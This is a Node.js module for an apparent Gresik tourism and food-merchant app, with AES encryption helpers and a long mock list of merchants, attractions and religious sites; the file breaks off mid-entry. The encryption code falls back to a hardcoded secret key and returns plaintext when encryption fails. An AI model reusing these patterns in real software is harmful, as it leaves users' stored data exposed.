const fs = require('fs');
const path = require('path');
const crypto = require('crypto');
const bcrypt = require('bcrypt');

const DB_PATH = path.join(__dirname, 'data', 'database.json');
const ALGORITHM = 'aes-256-cbc';
const ENCRYPTION_KEY = process.env.ENCRYPTION_KEY || 'grestripsupersecretkeyforallergies!'; 
const IV_LENGTH = 16;

// AES-256 Encryption
function encrypt(text) {
    if (!text) return '';
    try {
        const iv = crypto.randomBytes(IV_LENGTH);
        const cipher = crypto.createCipheriv(ALGORITHM, Buffer.from(ENCRYPTION_KEY.padEnd(32).substring(0, 32)), iv);
        let encrypted = cipher.update(text, 'utf8', 'hex');
        encrypted += cipher.final('hex');
        return iv.toString('hex') + ':' + encrypted;
    } catch (e) {
        console.error('Encryption failed:', e);
        return text;
    }
}

// AES-256 Decryption
function decrypt(ciphertext) {
    if (!ciphertext || !ciphertext.includes(':')) return ciphertext;
    try {
        const parts = ciphertext.split(':');
        const iv = Buffer.from(parts.shift(), 'hex');
        const encryptedText = Buffer.from(parts.join(':'), 'hex');
        const decipher = crypto.createDecipheriv(ALGORITHM, Buffer.from(ENCRYPTION_KEY.padEnd(32).substring(0, 32)), iv);
        let decrypted = decipher.update(encryptedText, 'hex', 'utf8');
        decrypted += decipher.final('utf8');
        return decrypted;
    } catch (e) {
        console.error('Decryption failed:', e.message);
        return '[Terdekripsi Gagal]';
    }
}

// Initial Mock Data Structure
const initialData = {
    merchants: [
            {
                "id": "m1",
                "name": "Nasi Krawu Bu Azza",
                "owner": "Ibu Azza",
                "type": "kuliner",
                "image": "https://images.unsplash.com/photo-1565557623262-b51c2513a641?auto=format&fit=crop&w=600&q=80",
                "description": "Nasi Krawu legendaris khas Gresik dengan suwiran daging sapi empuk, serundeng manis pedas, dan sambal petis super nikmat.",
                "coords": [
                    -7.161,
                    112.6565
                ],
                "rating": 4.8,
                "reviewsCount": 3,
                "catalog": [
                    {
                        "id": "c1_1",
                        "name": "Nasi Krawu Daging",
                        "price": 20000,
                        "description": "Nasi pulen hangat disajikan di atas daun pisang dengan suwiran daging sapi gurih."
                    },
                    {
                        "id": "c1_2",
                        "name": "Nasi Krawu Babat Paru",
                        "price": 22000,
                        "description": "Kombinasi babat dan paru goreng bumbu rempah melimpah."
                    }
                ]
            },
            {
                "id": "m2",
                "name": "Otak-otak Bandeng Pak Elan II",
                "owner": "Pak Elan",
                "type": "kuliner",
                "image": "https://images.unsplash.com/photo-1546069901-ba9599a7e63c?auto=format&fit=crop&w=600&q=80",
                "description": "Bandeng tanpa duri legendaris yang dibakar sempurna dengan isian daging bandeng cincang berbumbu rahasia warisan leluhur.",
                "coords": [
                    -7.1642,
                    112.645
                ],
                "rating": 4.7,
                "reviewsCount": 3,
                "catalog": [
                    {
                        "id": "c2_1",
                        "name": "Otak-otak Bandeng Bakar (Utuh)",
                        "price": 65000,
                        "description": "Satu ekor bandeng utuh tanpa duri isi otak-otak panggang wangi."
                    }
                ]
            },
            {
                "id": "m3",
                "name": "Warung Kopi Amak (Kopi Kasar)",
                "owner": "Cak Amak",
                "type": "kuliner",
                "image": "https://images.unsplash.com/photo-1596797038530-2c107229654b?auto=format&fit=crop&w=600&q=80",
                "description": "Tempat nongkrong ikonik Gresik yang menyajikan kopi tubruk kasar khas, diseduh langsung dari biji kopi robusta pilihan.",
                "coords": [
                    -7.1585,
                    112.652
                ],
                "rating": 4.6,
                "reviewsCount": 3,
                "catalog": [
                    {
                        "id": "c3_1",
                        "name": "Kopi Kasar Cangkir",
                        "price": 4000,
                        "description": "Kopi robusta tubruk dengan ampas kasar yang bisa diseruput nikmat."
                    }
                ]
            },
            {
                "id": "m4",
                "name": "Pudak Cap Kuda Terbang",
                "owner": "H. Sukri",
                "type": "kuliner",
                "image": "https://images.unsplash.com/photo-1509042239860-f550ce710b93?auto=format&fit=crop&w=600&q=80",
                "description": "Pusat jajanan pudak tradisional Gresik yang dibungkus pelepah pinang (ope), rasanya manis, legit, dan sangat wangi pandan asli.",
                "coords": [
                    -7.155,
                    112.659
                ],
                "rating": 4.7,
                "reviewsCount": 3,
                "catalog": [
                    {
                        "id": "c4_1",
                        "name": "Pudak Pandan (1 Ikat)",
                        "price": 30000,
                        "description": "Satu ikat pudak rasa pandan isi 10 biji wangi daun suji alami."
                    }
                ]
            },
            {
                "id": "m5",
                "name": "Sego Rumat Khas Gresik",
                "owner": "Mak Rumat",
                "type": "kuliner",
                "image": "https://images.unsplash.com/photo-1589301760014-d929f3979dbc?auto=format&fit=crop&w=600&q=80",
                "description": "Kuliner sarapan pagi khas berupa nasi lodeh sayur gurih yang disajikan dengan taburan serundeng kelapa kuning yang khas.",
                "coords": [
                    -7.1622,
                    112.658
                ],
                "rating": 4.5,
                "reviewsCount": 3,
                "catalog": [
                    {
                        "id": "c5_1",
                        "name": "Sego Rumat Telur",
                        "price": 12000,
                        "description": "Nasi sayur lodheh dipadu dengan telur dadar/ceplok gurih."
                    }
                ]
            },
            {
                "id": "m6",
                "name": "Soto Ayam Djadi Gresik",
                "owner": "Pak Djadi",
                "type": "kuliner",
                "image": "https://images.unsplash.com/photo-1512621776951-a57141f2eefd?auto=format&fit=crop&w=600&q=80",
                "description": "Soto ayam dengan kuah kuning kental kaya koya udang super gurih, disajikan dengan suwiran ayam kampung melimpah.",
                "coords": [
                    -7.1565,
                    112.648
                ],
                "rating": 4.6,
                "reviewsCount": 3,
                "catalog": [
                    {
                        "id": "c6_1",
                        "name": "Soto Ayam Biasa",
                        "price": 18000,
                        "description": "Semangkuk soto ayam hangat tabur koya gurih."
                    }
                ]
            },
            {
                "id": "m7",
                "name": "Bakso Jempolan Gresik",
                "owner": "Mas Jempol",
                "type": "kuliner",
                "image": "https://images.unsplash.com/photo-1606787366850-de6330128bfc?auto=format&fit=crop&w=600&q=80",
                "description": "Bakso urat sapi asli dengan kaldu bening yang gurih alami dan pentol jumbo isi tetelan daging sapi melimpah.",
                "coords": [
                    -7.168,
                    112.661
                ],
                "rating": 4.5,
                "reviewsCount": 3,
                "catalog": [
                    {
                        "id": "c7_1",
                        "name": "Bakso Tetelan Super",
                        "price": 20000,
                        "description": "Satu porsi bakso isi pentol jumbo tetelan melimpah."
                    }
                ]
            },
            {
                "id": "m8",
                "name": "Bubur Rumahan GKB",
                "owner": "Mbak Yuli",
                "type": "kuliner",
                "image": "https://images.unsplash.com/photo-1555939594-58d7cb561ad1?auto=format&fit=crop&w=600&q=80",
                "description": "Bubur ayam Jakarta premium di daerah perumahan GKB, disajikan dengan kuah kuning kental dan sate usus/rempela ati.",
                "coords": [
                    -7.1495,
                    112.639
                ],
                "rating": 4.6,
                "reviewsCount": 3,
                "catalog": [
                    {
                        "id": "c8_1",
                        "name": "Bubur Ayam Istimewa",
                        "price": 13000,
                        "description": "Bubur ayam lengkap dengan sate telur puyuh."
                    }
                ]
            },
            {
                "id": "m9",
                "name": "Nasi Krawu Bu Tiban",
                "owner": "Hj. Tiban",
                "type": "kuliner",
                "image": "https://images.unsplash.com/photo-1565557623262-b51c2513a641?auto=format&fit=crop&w=600&q=80",
                "description": "Nasi Krawu legendaris lainnya dengan ciri khas serundeng kelapa tiga warna yang manis, gurih, dan pedas berpadu sempurna.",
                "coords": [
                    -7.1598,
                    112.6582
                ],
                "rating": 4.8,
                "reviewsCount": 3,
                "catalog": [
                    {
                        "id": "c9_1",
                        "name": "Nasi Krawu Komplit",
                        "price": 23000,
                        "description": "Nasi Krawu porsi besar isi daging suwir dan jeroan lengkap."
                    }
                ]
            },
            {
                "id": "m10",
                "name": "Kue Bonggolan Sidayu",
                "owner": "Cak Mat Bonggolan",
                "type": "kuliner",
                "image": "https://images.unsplash.com/photo-1546069901-ba9599a7e63c?auto=format&fit=crop&w=600&q=80",
                "description": "Makanan ringan khas pesisir Sidayu terbuat dari tepung tapioka dan olahan ikan laut segar kenyal mirip pempek.",
                "coords": [
                    -6.985,
                    112.565
                ],
                "rating": 4.6,
                "reviewsCount": 3,
                "catalog": [
                    {
                        "id": "c10_1",
                        "name": "Bonggolan Ikan Tenggiri",
                        "price": 10000,
                        "description": "Satu lenjer bonggolan ikan tenggiri gurih kenyal."
                    }
                ]
            },
            {
                "id": "m11",
                "name": "Nasi Boran Mbak Lis",
                "owner": "Mbak Lis",
                "type": "kuliner",
                "image": "https://images.unsplash.com/photo-1596797038530-2c107229654b?auto=format&fit=crop&w=600&q=80",
                "description": "Nasi boranan dengan bumbu kuah pedas khas pesisir utara dan lauk ikan sili goreng garing yang sangat gurih.",
                "coords": [
                    -7.153,
                    112.6515
                ],
                "rating": 4.5,
                "reviewsCount": 3,
                "catalog": [
                    {
                        "id": "c11_1",
                        "name": "Nasi Boran Lauk Ikan Sili",
                        "price": 18000,
                        "description": "Nasi boranan hangat dengan ikan sili goreng renyah."
                    }
                ]
            },
            {
                "id": "m12",
                "name": "Jubung Khas Gresik",
                "owner": "Bu Salmah",
                "type": "kuliner",
                "image": "https://images.unsplash.com/photo-1509042239860-f550ce710b93?auto=format&fit=crop&w=600&q=80",
                "description": "Jajanan tradisional mirip jenang yang terbuat dari ketan hitam wangi ditaburi wijen di dalam cangkir daun kelapa.",
                "coords": [
                    -7.152,
                    112.662
                ],
                "rating": 4.6,
                "reviewsCount": 3,
                "catalog": [
                    {
                        "id": "c12_1",
                        "name": "Jubung Ketan Hitam (Isi 5)",
                        "price": 15000,
                        "description": "Satu wadah jubung ketan hitam wangi legit tabur wijen."
                    }
                ]
            },
            {
                "id": "m13",
                "name": "Martabak Usus Mak Jah",
                "owner": "Mak Jah",
                "type": "kuliner",
                "image": "https://images.unsplash.com/photo-1589301760014-d929f3979dbc?auto=format&fit=crop&w=600&q=80",
                "description": "Martabak telur asin dengan isian usus ayam berbumbu pedas gurih melimpah, jajanan kaki lima khas Gresik terlaris.",
                "coords": [
                    -7.165,
                    112.653
                ],
                "rating": 4.4,
                "reviewsCount": 3,
                "catalog": [
                    {
                        "id": "c13_1",
                        "name": "Martabak Usus Spesial Pedas",
                        "price": 15000,
                        "description": "Martabak usus porsi dobel dengan irisan cabai rawit setan."
                    }
                ]
            },
            {
                "id": "m14",
                "name": "Pantai Pasir Putih Dalegan",
                "owner": "Kelompok Sadar Wisata Dalegan",
                "type": "alam",
                "image": "https://images.unsplash.com/photo-1500530855697-b586d89ba3ee?auto=format&fit=crop&w=600&q=80",
                "description": "Pantai pasir putih dengan ombak yang tenang dan sangat aman untuk rekreasi keluarga serta wahana air di ujung utara Gresik.",
                "coords": [
                    -6.9015,
                    112.502
                ],
                "rating": 4.5,
                "reviewsCount": 3,
                "catalog": [
                    {
                        "id": "c14_1",
                        "name": "Tiket Masuk Pantai",
                        "price": 10000,
                        "description": "Tiket terusan rekreasi area pantai pasir putih."
                    }
                ]
            },
            {
                "id": "m15",
                "name": "Bukit Kapur Sekapuk (Selo Tirto Giri)",
                "owner": "BUMDes Sekapuk",
                "type": "alam",
                "image": "https://images.unsplash.com/photo-1507525428034-b723cf961d3e?auto=format&fit=crop&w=600&q=80",
                "description": "Situs tambang kapur aktif yang disulap menjadi taman arsitektur batu pilar kuno bergaya Yunani dengan pemandangan danau buatan.",
                "coords": [
                    -6.9245,
                    112.463
                ],
                "rating": 4.8,
                "reviewsCount": 3,
                "catalog": [
                    {
                        "id": "c15_1",
                        "name": "Tiket Masuk Setigi",
                        "price": 20000,
                        "description": "Akses masuk spot wisata foto pilar tebing Sekapuk."
                    }
                ]
            },
            {
                "id": "m16",
                "name": "Bukit Jamur Bungah",
                "owner": "Pengelola Bukit Jamur",
                "type": "alam",
                "image": "https://images.unsplash.com/photo-1501785888041-af3ef285b470?auto=format&fit=crop&w=600&q=80",
                "description": "Fenomena alam langka batuan kapur terkikis angin membentuk payung menyerupai cendawan raksasa (jamur batu).",
                "coords": [
                    -7.062,
                    112.583
                ],
                "rating": 4.5,
                "reviewsCount": 3,
                "catalog": [
                    {
                        "id": "c16_1",
                        "name": "Tiket Masuk Bukit Jamur",
                        "price": 5000,
                        "description": "Tiket masuk per orang menyaksikan formasi batu jamur."
                    }
                ]
            },
            {
                "id": "m17",
                "name": "Telaga Ngipik (Gresik Indah)",
                "owner": "Perum Perhutani Gresik",
                "type": "alam",
                "image": "https://images.unsplash.com/photo-1470071459604-3b5ec3a7fe05?auto=format&fit=crop&w=600&q=80",
                "description": "Oasis hijau di tengah kawasan industri berupa danau sejuk dengan fasilitas sewa perahu dan arena bermain ski air.",
                "coords": [
                    -7.151,
                    112.6395
                ],
                "rating": 4.3,
                "reviewsCount": 3,
                "catalog": [
                    {
                        "id": "c17_1",
                        "name": "Sewa Perahu Dayung (30 mnt)",
                        "price": 15000,
                        "description": "Perahu dayung santai keliling danau Telaga Ngipik."
                    }
                ]
            },
            {
                "id": "m18",
                "name": "Pantai Mengare & Benteng Lodewijk",
                "owner": "Pokdarwis Mengare",
                "type": "alam",
                "image": "https://images.unsplash.com/photo-1464822759023-fed622ff2c3b?auto=format&fit=crop&w=600&q=80",
                "description": "Destinasi wisata petualangan pesisir berupa hutan bakau rindang yang berdampingan dengan reruntuhan benteng kolonial Belanda.",
                "coords": [
                    -7.025,
                    112.615
                ],
                "rating": 4.4,
                "reviewsCount": 3,
                "catalog": [
                    {
                        "id": "c18_1",
                        "name": "Sewa Perahu Kayu Penyeberangan",
                        "price": 50000,
                        "description": "Sewa perahu kayu PP menuju dermaga benteng pertahanan."
                    }
                ]
            },
            {
                "id": "m19",
                "name": "Bukit Larangan Panceng",
                "owner": "Karang Taruna Panceng",
                "type": "alam",
                "image": "https://images.unsplash.com/photo-1447752875215-b2761acb3c5d?auto=format&fit=crop&w=600&q=80",
                "description": "Puncak bukit hijau asri di Gresik Utara yang cocok untuk bumi perkemahan dan menikmati samudera awan pagi hari.",
                "coords": [
                    -6.918,
                    112.49
                ],
                "rating": 4.6,
                "reviewsCount": 3,
                "catalog": [
                    {
                        "id": "c19_1",
                        "name": "Izin Camping & Kebersihan",
                        "price": 10000,
                        "description": "Retribusi kebersihan per tenda bagi pengunjung camping."
                    }
                ]
            },
            {
                "id": "m20",
                "name": "Danau Kastoba Pulau Bawean",
                "owner": "Balai Besar KSDA Jatim",
                "type": "alam",
                "image": "https://images.unsplash.com/photo-1472214222541-d510753a4707?auto=format&fit=crop&w=600&q=80",
                "description": "Danau air tawar purba mistis di tengah bukit Pulau Bawean, dikelilingi hutan hujan tropis rimbun berhawa sejuk.",
                "coords": [
                    -5.795,
                    112.685
                ],
                "rating": 4.9,
                "reviewsCount": 3,
                "catalog": [
                    {
                        "id": "c20_1",
                        "name": "Tiket Cagar Alam Danau",
                        "price": 5000,
                        "description": "Akses masuk cagar alam konservasi danau Kastoba Bawean."
                    }
                ]
            },
            {
                "id": "m21",
                "name": "Tanjung Gaang Bawean",
                "owner": "Masyarakat Adat Tanjung Gaang",
                "type": "alam",
                "image": "https://images.unsplash.com/photo-1500530855697-b586d89ba3ee?auto=format&fit=crop&w=600&q=80",
                "description": "Hamparan tebing batu marmer megah di pinggir laut dengan air super jernih, menawarkan terumbu karang laut yang elok.",
                "coords": [
                    -5.845,
                    112.612
                ],
                "rating": 4.8,
                "reviewsCount": 3,
                "catalog": [
                    {
                        "id": "c21_1",
                        "name": "Tur Kapal Kaca (Per Orang)",
                        "price": 30000,
                        "description": "Tur melihat terumbu karang Bawean dari dasar kapal kaca transparan."
                    }
                ]
            },
            {
                "id": "m22",
                "name": "Suaka Rusa Bawean",
                "owner": "BKSDA Konservasi Bawean",
                "type": "alam",
                "image": "https://images.unsplash.com/photo-1507525428034-b723cf961d3e?auto=format&fit=crop&w=600&q=80",
                "description": "Pusat penangkaran spesies endemik langka Rusa Bawean (Axis kuhlii) di habitat hutan alaminya.",
                "coords": [
                    -5.811,
                    112.699
                ],
                "rating": 4.7,
                "reviewsCount": 3,
                "catalog": [
                    {
                        "id": "c22_1",
                        "name": "Edukasi Penangkaran Rusa",
                        "price": 5000,
                        "description": "Tiket konservasi satwa dilindungi rusa endemik Bawean."
                    }
                ]
            },
            {
                "id": "m23",
                "name": "Giri Noko (Pemandian Air Panas)",
                "owner": "Desa Wisata Giri Noko",
                "type": "alam",
                "image": "https://images.unsplash.com/photo-1501785888041-af3ef285b470?auto=format&fit=crop&w=600&q=80",
                "description": "Kolam mata air belerang alami yang hangat di lereng pegunungan Bawean, terkenal mujarab menyembuhkan lelah dan gatal.",
                "coords": [
                    -5.772,
                    112.654
                ],
                "rating": 4.5,
                "reviewsCount": 3,
                "catalog": [
                    {
                        "id": "c23_1",
                        "name": "Tiket Pemandian Air Hangat",
                        "price": 7000,
                        "description": "Retribusi masuk kolam pemandian belerang alami."
                    }
                ]
            },
            {
                "id": "m24",
                "name": "Pantai Gili Noko Bawean",
                "owner": "Pokdarwis Sidogiri Bawean",
                "type": "alam",
                "image": "https://images.unsplash.com/photo-1470071459604-3b5ec3a7fe05?auto=format&fit=crop&w=600&q=80",
                "description": "Pulau pasir tak berpenghuni dengan hamparan karang menakjubkan dan surga bagi para pencinta aktivitas snorkeling.",
                "coords": [
                    -5.76,
                    112.755
                ],
                "rating": 4.9,
                "reviewsCount": 3,
                "catalog": [
                    {
                        "id": "c24_1",
                        "name": "Paket Snorkeling Lengkap",
                        "price": 75000,
                        "description": "Sewa masker, fin, snorkel, jaket pelampung, dan foto underwater."
                    }
                ]
            },
            {
                "id": "m25",
                "name": "Taman Hutan Raya (Tahura) Panceng",
                "owner": "Dinas Kehutanan Gresik",
                "type": "alam",
                "image": "https://images.unsplash.com/photo-1464822759023-fed622ff2c3b?auto=format&fit=crop&w=600&q=80",
                "description": "Hutan jati dan mahoni lindung yang sejuk, dilengkapi jalur jogging, gardu pandang, dan spot berkemah keluarga.",
                "coords": [
                    -6.932,
                    112.479
                ],
                "rating": 4.4,
                "reviewsCount": 3,
                "catalog": [
                    {
                        "id": "c25_1",
                        "name": "Tiket Masuk Tahura",
                        "price": 5000,
                        "description": "Tiket masuk area hutan pinus dan mahoni Panceng."
                    }
                ]
            },
            {
                "id": "m26",
                "name": "Goa Lowo Panceng",
                "owner": "Pokdarwis Panceng Indah",
                "type": "alam",
                "image": "https://images.unsplash.com/photo-1447752875215-b2761acb3c5d?auto=format&fit=crop&w=600&q=80",
                "description": "Goa stalaktit eksotis habitat ribuan kelelawar, menyuguhkan pemandangan bebatuan kristal air yang berkilau indah.",
                "coords": [
                    -6.915,
                    112.482
                ],
                "rating": 4.3,
                "reviewsCount": 3,
                "catalog": [
                    {
                        "id": "c26_1",
                        "name": "Sewa Senter & Pemandu Goa",
                        "price": 20000,
                        "description": "Fasilitas pemandu lokal dan alat penerangan kepala."
                    }
                ]
            },
            {
                "id": "m27",
                "name": "Muara Bengawan Solo Ujungpangkah",
                "owner": "Nelayan Pangkah Wetan",
                "type": "alam",
                "image": "https://images.unsplash.com/photo-1472214222541-d510753a4707?auto=format&fit=crop&w=600&q=80",
                "description": "Titik pertemuan akhir sungai terpanjang di Jawa dengan Laut Jawa, menyuguhkan pemandangan hutan mangrove delta sungai.",
                "coords": [
                    -6.885,
                    112.565
                ],
                "rating": 4.5,
                "reviewsCount": 3,
                "catalog": [
                    {
                        "id": "c27_1",
                        "name": "Sewa Perahu Susur Sungai",
                        "price": 100000,
                        "description": "Tur perahu kayu susur muara sungai durasi 45 menit maks 5 pax."
                    }
                ]
            },
            {
                "id": "m28",
                "name": "Hutan Kemasyarakatan Mangrove Pangkah",
                "owner": "HKm Pangkah Kulon",
                "type": "alam",
                "image": "https://images.unsplash.com/photo-1500530855697-b586d89ba3ee?auto=format&fit=crop&w=600&q=80",
                "description": "Suaka alam pelestarian hutan bakau pesisir yang menjadi tempat persinggahan puluhan burung migran mancanegara.",
                "coords": [
                    -6.892,
                    112.541
                ],
                "rating": 4.6,
                "reviewsCount": 3,
                "catalog": [
                    {
                        "id": "c28_1",
                        "name": "Tiket Jembatan Kayu Mangrove",
                        "price": 10000,
                        "description": "Akses jembatan kayu menyusuri kedalaman rimbun hutan bakau."
                    }
                ]
            },
            {
                "id": "m29",
                "name": "Makam Sunan Giri",
                "owner": "Yayasan Makam Sunan Giri",
                "type": "religi",
                "image": "https://images.unsplash.com/photo-1609137144813-2d5774a38f38?auto=format&fit=crop&w=600&q=80",
                "description": "Situs ziarah makam agung Raden Paku (Sunan Giri), salah satu tokoh Walisongo pendiri kerajaan Giri Kedaton.",
                "coords": [
                    -7.1725,
                    112.631
                ],
                "rating": 4.9,
                "reviewsCount": 3,
                "catalog": [
                    {
                        "id": "c29_1",
                        "name": "Infaq Makam Sunan Giri",
                        "price": 2000,
                        "description": "Sumbangan sukarela perawatan area makam cagar budaya."
                    }
                ]
            },
            {
                "id": "m30",
                "name": "Makam Syekh Maulana Malik Ibrahim",
                "owner": "Yayasan Syekh Maulana Malik Ibrahim",
                "type": "religi",
                "image": "https://images.unsplash.com/photo-1564507592333-c60657eea523?auto=format&fit=crop&w=600&q=80",
                "description": "Kompleks pemakaman wali tertua di Jawa (Sunan Gresik), wafat pada 1419 M dengan arsitektur nisan batu marmer Gujarat kuno.",
                "coords": [
                    -7.158,
                    112.6575
                ],
                "rating": 4.9,
                "reviewsCount": 3,
                "catalog": [
                    {
                        "id": "c30_1",
                        "name": "Ziarah Situs Wali Pertama",
                        "price": 2000,
                        "description": "Retribusi kebersihan kawasan gapura makam Maulana."
                    }
                ]
            },
            {
                "id": "m31",
                "name": "Makam Fatimah binti Maimun",
                "owner": "Balai Pelestarian Cagar Budaya Jatim",
                "type": "religi",
                "image": "https://images.unsplash.com/photo-1584551246679-0daf3d275d0f?auto=format&fit=crop&w=600&q=80",
                "description": "Nisan makam Islam tertua di Nusantara dan Asia Tenggara bertarikh 1082 M, membuktikan persebaran awal peradaban Islam di Leran.",
                "coords": [
                    -7.125,
                    112.605
                ],
                "rating": 4.8,
                "reviewsCount": 3,
                "catalog": [
                    {
                        "id": "c31_1",
                        "name": "Panduan Sejarah Prasasti Leran",
                        "price": 25000,
                        "description": "Edukasi naskah prasasti nisan Fatimah binti Maimun."
                    }
                ]
            },
            {
                "id": "m32",
                "name": "Makam Sunan Prapen",
                "owner": "Juru Kunci Makam Prapen",
                "type": "religi",
                "image": "https://images.unsplash.com/photo-1597935258735-e254c1839512?auto=format&fit=crop&w=600&q=80",
                "description": "Makam adipati Giri Kedaton keempat yang memimpin kejayaan politik dan penempa pusaka sakti di wilayah Nusantara.",
                "coords": [
                    -7.174,
                    112.628
                ],
                "rating": 4.7,
                "reviewsCount": 3,
                "catalog": [
                    {
                        "id": "c32_1",
                        "name": "Kunjungan Area Makam Prapen",
                        "price": 2000,
                        "description": "Sumbangan dana abadi pelestarian cungkup kayu ukir."
                    }
                ]
            },
            {
                "id": "m33",
                "name": "Masjid KH Ahmad Dahlan Gresik",
                "owner": "PD Muhammadiyah Gresik",
                "type": "religi",
                "image": "https://images.unsplash.com/photo-1609137144813-2d5774a38f38?auto=format&fit=crop&w=600&q=80",
                "description": "Masjid megah berarsitektur modern dengan kubah emas besar di pintu masuk tol Kebomas, ikon baru perkotaan Gresik.",
                "coords": [
                    -7.1765,
                    112.615
                ],
                "rating": 4.8,
                "reviewsCount": 3,
                "catalog": [
                    {
                        "id": "c33_1",
                        "name": "Infaq Pembangunan Dakwah",
                        "price": 5000,
                        "description": "Infaq donasi pemeliharaan fasilitas ibadah masjid raya."
                    }
                ]
            },
            {
                "id": "m34",
                "name": "Makam Kanjeng Sepuh Sidayu",
                "owner": "Yayasan Kanjeng Sepuh",
                "type": "religi",
                "image": "https://images.unsplash.com/photo-1564507592333-c60657eea523?auto=format&fit=crop&w=600&q=80",
                "description": "Situs ziarah makam bupati legendaris Kadipaten Sidayu Pangeran Haryo Suryodiningrat yang terkenal sakti mandraguna.",
                "coords": [
                    -6.989,
                    112.5645
                ],
                "rating": 4.7,
                "reviewsCount": 3,
                "catalog": [
                    {
                        "id": "c34_1",
                        "name": "Buku Sejarah Kadipaten Sidayu",
                        "price": 35000,
                        "description": "Buku saku sejarah perjuangan Kanjeng Sepuh Sidayu."
                    }
                ]
            },
            {
                "id": "m35",
                "name": "Masjid Jami' Gresik (Masjid Alun-Alun)",
                "owner": "Takmir Masjid Jami' Gresik",
                "type": "religi",
                "image": "https://images.unsplash.com/photo-1584551246679-0daf3d275d0f?auto=format&fit=crop&w=600&q=80",
                "description": "Masjid bersejarah yang didirikan oleh Sunan Gresik abad ke-15, pusat syiar Islam tertua di pantai utara Jawa Timur.",
                "coords": [
                    -7.1578,
                    112.6568
                ],
                "rating": 4.9,
                "reviewsCount": 3,
                "catalog": [
                    {
                        "id": "c35_1",
                        "name": "Donasi Program Jumat Berkah",
                        "price": 10000,
                        "description": "Sedekah nasi kotak jumat berkah untuk jamaah masjidi."
                    }
                ]
            },
            {
                "id": "m36",
                "name": "Makam Habib Abu Bakar Assegaf",
                "owner": "Keluarga Al-Habsyi / Assegaf",
                "type": "religi",
                "image": "https://images.unsplash.com/photo-1597935258735-e254c1839512?auto=format&fit=crop&w=600&q=80",
                "description": "Makam wali qutub agung yang terletak di sayap utara Masjid Jami' Gresik, diziarahi jutaan umat saat Haul akbarnya.",
                "coords": [
                    -7.1575,
                    112.657
                ],
                "rating": 4.9,
                "reviewsCount": 3,
                "catalog": [
                    {
                        "id": "c36_1",
                        "name": "Infaq Pemeliharaan Makam",
                        "price": 2000,
                        "description": "Sumbangan kebersihan kubah makam Habib Abu Bakar."
                    }
                ]
            },
            {
                "id": "m37",
                "name": "Masjid KH Hasyim Asy'ari Gresik",
                "owner": "PCNU Gresik",
                "type": "religi",
                "image": "https://images.unsplash.com/photo-1609137144813-2d5774a38f38?auto=format&fit=crop&w=600&q=80",
                "description": "Masjid besar bernuansa ornamen Nusantara dengan ukiran kayu jati khas Jawa, pusat kegiatan kemasyarakatan islam daerah GKB.",
                "coords": [
                    -7.141,
                    112.632
                ],
                "rating": 4.7,
                "reviewsCount": 3,
                "catalog": [
                    {
                        "id": "c37_1",
                        "name": "Zakat Infak Sedekah",
                        "price": 25000,
                        "description": "Penyaluran ZIS untuk anak yatim binaan masjid NU."
                    }
                ]
            },
            {
                "id": "m38",
                "name": "Klenteng Kim Hin Kiong",
                "owner": "Yayasan Klenteng Gresik",
                "type": "religi",
                "image": "https://images.unsplash.com/photo-1564507592333-c60657eea523?auto=format&fit=crop&w=600&q=80",
                "description": "Klenteng tertua di Jawa Timur yang didirikan pada tahun 1153 M di kawasan Pecinan Gresik, lambang toleransi beragama.",
                "coords": [
                    -7.156,
                    112.6615
                ],
                "rating": 4.6,
                "reviewsCount": 3,
                "catalog": [
                    {
                        "id": "c38_1",
                        "name": "Infaq lilin persembahyangan",
                        "price": 15000,
                        "description": "Lilin doa perdamaian warna merah khas kelenteng."
                    }
                ]
            },
            {
                "id": "m39",
                "name": "Makam Wali Songo - Sunan Drajat (Batas Gresik)",
                "owner": "Balai Pelestarian Kebudayaan",
                "type": "religi",
                "image": "https://images.unsplash.com/photo-1584551246679-0daf3d275d0f?auto=format&fit=crop&w=600&q=80",
                "description": "Situs ziarah makam wali penyebar Islam Raden Qasim Sunan Drajat yang terletak tepat di perbatasan utara Gresik-Lamongan.",
                "coords": [
                    -6.895,
                    112.45
                ],
                "rating": 4.8,
                "reviewsCount": 3,
                "catalog": [
                    {
                        "id": "c39_1",
                        "name": "Buku Tuntunan Tembang Pangkur",
                        "price": 20000,
                        "description": "Buku seni gamelan dan tembang ciptaan Sunan Drajat."
                    }
                ]
            },
            {
                "id": "m40",
                "name": "Masjid Kuno Kiai Gede Bungah",
                "owner": "Takmir Masjid Kiai Gede",
                "type": "religi",
                "image": "https://images.unsplash.com/photo-1597935258735-e254c1839512?auto=format&fit=crop&w=600&q=80",
                "description": "Masjid bersejarah bercorak atap tumpang soko guru kayu jati tanpa paku peninggalan penyebar Islam Kiai Gede abad 16.",
                "coords": [
                    -7.065,
                    112.595
                ],
                "rating": 4.7,
                "reviewsCount": 3,
                "catalog": [
                    {
                        "id": "c40_1",
                        "name": "Infaq Pemeliharaan Soko Guru",
                        "price": 5000,
                        "description": "Dana rehabilitasi soko guru kayu antik peninggalan wali."
                    }
                ]
            },
            {
                "id": "m41",
                "name": "Makam Sunan Sindu Bawean",
                "owner": "Pokdarwis Sindu Bawean",
                "type": "religi",
                "image": "https://images.unsplash.com/photo-1609137144813-2d5774a38f38?auto=format&fit=crop&w=600&q=80",
                "description": "Situs ziarah makam wali sepuh penyebar agama Islam pertama di dataran Pulau Bawean, terletak di atas tebing tepi pantai.",
                "coords": [
                    -5.842,
                    112.721
                ],
                "rating": 4.6,
                "reviewsCount": 3,
                "catalog": [
                    {
                        "id": "c41_1",
                        "name": "Buku Sejarah Islam Bawean",
                        "price": 25000,
                        "description": "Buku napak tilas sejarah dakwah wali Sunan Sindu Bawean."
                    }
                ]
            },
            {
                "id": "m42",
                "name": "Makam Syekh Umar Mas'ud Bawean",
                "owner": "Yayasan Syekh Umar Mas'ud",
                "type": "religi",
                "image": "https://images.unsplash.com/photo-1564507592333-c60657eea523?auto=format&fit=crop&w=600&q=80",
                "description": "Situs ziarah tokoh ulama karismatik penyebar Islam di Bawean yang merupakan cucu dari Sunan Giri.",
                "coords": [
                    -5.765,
                    112.639
                ],
                "rating": 4.8,
                "reviewsCount": 3,
                "catalog": [
                    {
                        "id": "c42_1",
                        "name": "Infaq Cungkup Makam Umar",
                        "price": 2000,
                        "description": "Sumbangan kebersihan makam Syekh Umar Mas'ud."
                    }
                ]
            },
            {
                "id": "m43",
                "name": "Masjid KH Robbach Ma'sum",
                "owner": "Pemkab Gresik",
                "type": "religi",
                "image": "https://images.unsplash.com/photo-1584551246679-0daf3d275d0f?auto=format&fit=crop&w=600&q=80",
